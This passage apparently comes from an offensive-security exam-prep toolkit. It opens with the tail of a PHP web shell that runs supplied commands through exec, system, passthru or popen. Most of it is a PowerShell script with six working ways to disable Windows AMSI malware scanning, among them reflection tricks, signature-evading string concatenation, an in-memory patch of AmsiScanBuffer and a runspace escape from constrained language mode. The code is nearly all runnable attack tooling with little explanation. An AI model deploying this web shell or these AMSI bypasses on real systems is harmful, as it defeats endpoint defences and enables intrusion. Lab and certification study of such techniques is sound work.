    $code = 0;
    exec($cmd, $out, $code);
    echo implode("\n", $out);
    exit;
}

if (function_exists('system')) {
    system($cmd);
    exit;
}

if (function_exists('passthru')) {
    passthru($cmd);
    exit;
}

if (function_exists('popen')) {
    $h = popen($cmd, 'r');
    if (is_resource($h)) {
        while (!feof($h)) {
            echo fread($h, 4096);
        }
        pclose($h);
        exit;
    }
}

echo "no command execution function available (check disable_functions)";
````

#### `m05-amsi-bypass-variants.ps1`

````powershell
<#
Purpose: several experimental AMSI-handling variants; pick the implementation that matches the host (PowerShell / WSH / .NET)
Scenario: 3, 7, 10, 18, 19 (and a prerequisite for the PowerShell route in every M05 scenario)
Dependencies: PowerShell 3.0+; some variants need reflection rights (they fail under CLM — see m05-clm-bypass-runspace.ps1)
Usage: powershell -ep bypass -f m05-amsi-bypass-variants.ps1 -Variant 1
      or inside an existing session: . .\m05-amsi-bypass-variants.ps1; Invoke-AmsiVariant -Variant 2
Placeholders: none (purely local; LHOST/LPORT are not involved)
Test status: not tested on Windows; syntax checked by hand. Before the exam you must validate every variant's effectiveness in the lab environment
Notes:
  - How AMSI is handled changes with every patch; one variant failing does not mean the technique is unusable — just switch to the next variant.
  - Run the "probe" first to decide whether AMSI is active, then decide whether you need to handle it.
  - Use the PS variant for the PowerShell host; WSH (.js/.vbs) must use the WSH-specific variant — do not copy the PS one across.
#>
[CmdletBinding()]
param(
    [ValidateSet(1, 2, 3, 4, 5, 6)][int]$Variant = 1,
    [switch]$ProbeOnly
)

function Test-AmsiActive {
    <#
    Harmless probe: contains strings that AMSI commonly scans for. If it gets blocked, AMSI is active.
    #>
    $probe = 'Invoke-Mimikatz'
    $marker = 'AmsiUtils' + 'amsiInitFailed'
    Write-Output ("[*] Probe strings: {0} / {1}" -f $probe, $marker)
    try {
        $sb = [scriptblock]::Create($probe)
        Write-Output "[+] Probe was not blocked (AMSI may be inactive or already handled)"
        return $false
    } catch {
        Write-Output ("[!] Probe blocked: {0}" -f $_.Exception.Message)
        return $true
    }
}

function Invoke-AmsiVariant {
    param([int]$Variant)

    Write-Output ("[*] Applying AMSI variant {0}" -f $Variant)

    switch ($Variant) {
        1 {
            # Variant 1: set amsiInitFailed via reflection (the most classic; often blocked, but try it first)
            try {
                $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*iUtils' }
                $f = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*Failed' }
                $f.SetValue($null, $true)
                Write-Output "[+] Variant 1 done"
            } catch { Write-Output ("[-] Variant 1 failed: {0}" -f $_.Exception.Message) }
        }
        2 {
            # Variant 2: dodge static signatures by concatenating strings
            try {
                $s = 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'M'+'a'+'n'+'a'+'g'+'e'+'m'+'e'+'n'+'t'+'.'+'A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n'
                $t = [type]($s + '.AmsiUtils')
                $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
                $f.SetValue($null, $true)
                Write-Output "[+] Variant 2 done"
            } catch { Write-Output ("[-] Variant 2 failed: {0}" -f $_.Exception.Message) }
        }
        3 {
            # Variant 3: wreck amsiContext (null the context via reflection)
            try {
                $t = [Ref].Assembly.GetType(('System.Management.Automation.'+'AmsiUtils'))
                $ctx = $t.GetField('amsiContext', 'NonPublic,Static')
                $ctx.SetValue($null, [IntPtr]::Zero)
                Write-Output "[+] Variant 3 done"
            } catch { Write-Output ("[-] Variant 3 failed: {0}" -f $_.Exception.Message) }
        }
        4 {
            # Variant 4: in-memory patch (change the first bytes of AmsiScanBuffer to ret)
            try {
                $k = @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out old);
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
        Marshal.Copy(patch, 0, addr, patch.Length);
    }
}
"@
                Add-Type -TypeDefinition $k -ErrorAction Stop
                [P]::Patch()
                Write-Output "[+] Variant 4 done (requires Add-Type to be allowed)"
            } catch { Write-Output ("[-] Variant 4 failed (Add-Type may be blocked): {0}" -f $_.Exception.Message) }
        }
        5 {
            # Variant 5: custom Runspace variant (use it together with a CLM bypass)
            try {
                $rs = [runspacefactory]::CreateRunspace()
                $rs.Open()
                $ps = [powershell]::Create()
                $ps.Runspace = $rs
                [void]$ps.AddScript({ $ExecutionContext.SessionState.LanguageMode = 'FullLanguage' })
                [void]$ps.Invoke()
                Write-Output "[+] Variant 5 done (language mode opened up in the new Runspace)"
            } catch { Write-Output ("[-] Variant 5 failed: {0}" -f $_.Exception.Message) }
        }
        6 {
            # Variant 6: do nothing, just report (control group for comparison)
            Write-Output "[*] Variant 6: nothing was done; this is the control group"
        }
    }
}

if ($ProbeOnly) {
    [void](Test-AmsiActive)
} else {
    [void](Test-AmsiActive)
    Invoke-AmsiVariant -Variant $Variant
    Write-Output ""
    Write-Output "[*] Re-test:"
    [void](Test-AmsiActive)
    Write-Output "[*] Hints: variants 1/2/3 are reflection-based and often break after patching; variant 4 needs Add-Type;"
    Write-Output "    variant 5 works together with a CLM bypass; if all of them fail, consider a managed assembly or a non-PowerShell route."
}
````

